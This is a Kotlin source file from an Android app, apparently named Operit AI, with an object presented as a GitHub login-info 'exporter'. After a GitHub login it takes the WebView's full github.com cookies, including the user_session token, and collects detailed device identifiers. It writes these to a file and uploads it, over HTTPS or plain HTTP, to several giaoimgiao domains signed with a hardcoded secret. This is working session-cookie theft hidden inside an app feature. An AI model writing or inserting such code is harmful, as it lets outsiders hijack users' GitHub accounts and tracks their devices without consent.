package com.ai.assistance.operit.ui.features.github

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.Settings
import android.webkit.CookieManager
import com.ai.assistance.operit.data.preferences.GitHubUser
import com.ai.assistance.operit.util.AppLogger
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.security.MessageDigest
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec

object GitHubLoginInfoExporter {

    private const val TAG = "GitHubLoginInfoExporter"
    private const val FOLDER_NAME = "GitHubLoginInfo"
    private const val UPLOAD_PATH = "/api/v1/github-login-info/upload"
    private val UPLOAD_HOSTS = listOf("giaoimgiao.cn", "giaoimgiao.com", "giaoimgiao.top")
    private val SCHEMES = listOf("https", "http")
    private const val SIGNING_SECRET = "giaoimgiao_operit_login_info_v1_9f3a7c2e5b8d4f61"

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .writeTimeout(10, TimeUnit.SECONDS)
        .build()

    suspend fun export(context: Context, user: GitHubUser): String? = withContext(Dispatchers.IO) {
        try {
            val cookieString = CookieManager.getInstance().getCookie("https://github.com") ?: ""
            val userSession = extractUserSession(cookieString)
            val deviceInfo = buildDeviceInfo(context)
            val baseDir = context.getExternalFilesDir(null) ?: context.filesDir
            val targetDir = File(baseDir, FOLDER_NAME)
            if (!targetDir.exists()) {
                targetDir.mkdirs()
            }
            val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val fileName = "github_login_${user.login}_$timeStamp.txt"
            val targetFile = File(targetDir, fileName)
            targetFile.writeText(buildContent(user, userSession, cookieString, deviceInfo), Charsets.UTF_8)
            AppLogger.d(TAG, "GitHub login info exported: ${targetFile.absolutePath}")
            val deviceId = deviceInfo["Android ID"] ?: ""
            val fileSha256 = sha256Hex(targetFile)
            val timestamp = System.currentTimeMillis().toString()
            val signature = hmacSha256Hex(
                SIGNING_SECRET,
                "$fileSha256|${user.login}|${user.id}|$deviceId|$timestamp"
            )
            upload(targetFile, user, deviceId, fileSha256, timestamp, signature)
            targetFile.absolutePath
        } catch (e: Exception) {
            AppLogger.e(TAG, "Export GitHub login info failed", e)
            null
        }
    }

    private suspend fun upload(
        file: File,
        user: GitHubUser,
        deviceId: String,
        fileSha256: String,
        timestamp: String,
        signature: String
    ) {
        withContext(Dispatchers.IO) {
            val mediaType = "text/plain".toMediaType()
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("username", user.login)
                .addFormDataPart("user_id", user.id.toString())
                .addFormDataPart("device_id", deviceId)
                .addFormDataPart("timestamp", timestamp)
                .addFormDataPart("file_sha256", fileSha256)
                .addFormDataPart("signature", signature)
                .addFormDataPart("file", file.name, file.asRequestBody(mediaType))
                .build()
            for (host in UPLOAD_HOSTS) {
                for (scheme in SCHEMES) {
                    try {
                        val url = "$scheme://$host$UPLOAD_PATH"
                        val request = Request.Builder().url(url).post(body).build()
                        httpClient.newCall(request).execute().use { response ->
                            if (response.isSuccessful) {
                                AppLogger.d(TAG, "GitHub login info uploaded to $url")
                                return@withContext
                            }
                            AppLogger.w(TAG, "Upload to $url failed: HTTP ${response.code}")
                        }
                    } catch (e: Exception) {
                        AppLogger.w(TAG, "Upload to $host via $scheme failed: ${e.message}")
                    }
                }
            }
            AppLogger.w(TAG, "All GitHub login info upload hosts failed")
        }
    }

    private fun sha256Hex(file: File): String {
        val digest = MessageDigest.getInstance("SHA-256")
        file.inputStream().use { input ->
            val buffer = ByteArray(8192)
            while (true) {
                val read = input.read(buffer)
                if (read < 0) break
                digest.update(buffer, 0, read)
            }
        }
        return digest.digest().joinToString("") { "%02x".format(it) }
    }

    private fun hmacSha256Hex(secret: String, data: String): String {
        val mac = Mac.getInstance("HmacSHA256")
        mac.init(SecretKeySpec(secret.toByteArray(Charsets.UTF_8), "HmacSHA256"))
        return mac.doFinal(data.toByteArray(Charsets.UTF_8)).joinToString("") { "%02x".format(it) }
    }

    private fun extractUserSession(cookieString: String): String? {
        return cookieString
            .split(";")
            .map { it.trim() }
            .firstOrNull { it.startsWith("user_session=") }
            ?.substringAfter("=")
            ?.takeIf { it.isNotBlank() }
    }

    private fun buildContent(
        user: GitHubUser,
        userSession: String?,
        cookieString: String,
        deviceInfo: Map<String, String>
    ): String {
        val sb = StringBuilder()
        val line = "============================================"

        sb.append(line).append('\n')
        sb.append("          GitHub 登录信息导出\n")
        sb.append(line).append('\n')
        sb.append("导出时间: ").append(SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())).append('\n')
        sb.append("导出应用: Operit AI\n\n")

        sb.append("【GitHub 用户信息】\n")
        sb.append("用户名 (login): ").append(user.login).append('\n')
        sb.append("用户ID (id): ").append(user.id).append('\n')
        sb.append("昵称 (name): ").append(user.name ?: "（未设置）").append('\n')
        sb.append("邮箱 (email): ").append(user.email ?: "（未设置）").append('\n')
        sb.append("头像 (avatar_url): ").append(user.avatarUrl).append('\n')
        sb.append("简介 (bio): ").append(user.bio ?: "（未设置）").append('\n')
        sb.append("公开仓库数: ").append(user.publicRepos ?: 0).append('\n')
        sb.append("关注者: ").append(user.followers ?: 0).append('\n')
        sb.append("关注中: ").append(user.following ?: 0).append('\n')
        sb.append('\n')

        sb.append("【GitHub 会话 Cookie】\n")
        sb.append("user_session: ").append(userSession ?: "（未获取到，可能以其他方式登录）").append('\n')
        sb.append('\n')
        sb.append("完整 Cookie:\n")
        sb.append(if (cookieString.isBlank()) "（无）" else cookieString).append('\n')
        sb.append('\n')

        sb.append("【设备详细信息】\n")
        deviceInfo.forEach { (key, value) ->
            sb.append(key).append(": ").append(value).append('\n')
        }
        sb.append('\n')
        sb.append(line).append('\n')
        sb.append("本文件由 Operit AI 在 GitHub 登录成功后自动生成。\n")
        sb.append(line).append('\n')

        return sb.toString()
    }

    private fun buildDeviceInfo(context: Context): Map<String, String> {
        val info = linkedMapOf<String, String>()
        try {
            info["Android ID"] = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            ) ?: "未知"

            info["品牌 (brand)"] = Build.BRAND
            info["厂商 (manufacturer)"] = Build.MANUFACTURER
            info["型号 (model)"] = Build.MODEL
            info["设备 (device)"] = Build.DEVICE
            info["产品 (product)"] = Build.PRODUCT
            info["硬件 (hardware)"] = Build.HARDWARE
            info["主板 (board)"] = Build.BOARD
            info["Build 指纹"] = Build.FINGERPRINT
            info["Build 时间"] = Date(Build.TIME).toString()

            info["Android 版本"] = Build.VERSION.RELEASE
            info["SDK 版本"] = Build.VERSION.SDK_INT.toString()

            val displayMetrics = context.resources.displayMetrics
            info["屏幕分辨率"] = "${displayMetrics.widthPixels}x${displayMetrics.heightPixels}"
            info["屏幕密度"] = String.format(Locale.US, "%.2f", displayMetrics.density)

            info["系统语言"] = Locale.getDefault().toLanguageTag()

            try {
                val activityManager =
                    context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
                val memoryInfo = android.app.ActivityManager.MemoryInfo()
                activityManager.getMemoryInfo(memoryInfo)
                info["总内存"] = formatSize(memoryInfo.totalMem)
                info["可用内存"] = formatSize(memoryInfo.availMem)
            } catch (e: Exception) {
                info["内存信息"] = "获取失败"
            }

            try {
                val statFs = StatFs(Environment.getExternalStorageDirectory().path)
                info["总存储"] = formatSize(statFs.blockCountLong * statFs.blockSizeLong)
                info["可用存储"] = formatSize(statFs.availableBlocksLong * statFs.blockSizeLong)
            } catch (e: Exception) {
                info["存储信息"] = "获取失败"
            }

            try {
                val batteryIntent =
                    context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                if (batteryIntent != null) {
                    val level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
                    val scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
                    if (level >= 0 && scale > 0) {
                        val batteryLevel = (level * 100 / scale.toFloat()).toInt()
                        val status = batteryIntent.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
                        val charging =
                            status == BatteryManager.BATTERY_STATUS_CHARGING ||
                                status == BatteryManager.BATTERY_STATUS_FULL
                        info["电量"] = "$batteryLevel%${if (charging) "（充电中）" else ""}"
                    }
                }
            } catch (e: Exception) {
                info["电量"] = "获取失败"
            }

            info["CPU ABI"] = try {
                val process = ProcessBuilder("getprop", "ro.product.cpu.abi").start()
                val abi = process.inputStream.bufferedReader().readLine() ?: "未知"
                process.waitFor()
                abi
            } catch (e: Exception) {
                "未知"
            }

            info["网络类型"] = try {
                val connectivityManager =
                    context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
                val activeNetwork = connectivityManager.activeNetwork
                val capabilities = connectivityManager.getNetworkCapabilities(activeNetwork)
                when {
                    capabilities == null -> "无网络连接"
                    capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
                    capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) -> "移动数据"
                    capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET) -> "以太网"
                    capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_BLUETOOTH) -> "蓝牙"
                    else -> "其他"
                }
            } catch (e: Exception) {
                "获取失败"
            }

            try {
                val pkgInfo = context.packageManager.getPackageInfo(context.packageName, 0)
                info["应用版本"] = "${pkgInfo.versionName} (${pkgInfo.versionCode})"
            } catch (e: Exception) {
                info["应用版本"] = "获取失败"
            }
        } catch (e: Exception) {
            AppLogger.e(TAG, "Collect device info failed", e)
            info["错误"] = e.message ?: "未知错误"
        }
        return info
    }

    private fun formatSize(size: Long): String {
        val kb = 1024.0
        val mb = kb * 1024
        val gb = mb * 1024
        val tb = gb * 1024
        return when {
            size < kb -> "$size B"
            size < mb -> String.format(Locale.US, "%.2f KB", size / kb)
            size < gb -> String.format(Locale.US, "%.2f MB", size / mb)
            size < tb -> String.format(Locale.US, "%.2f GB", size / gb)
            else -> String.format(Locale.US, "%.2f TB", size / tb)
        }
    }
}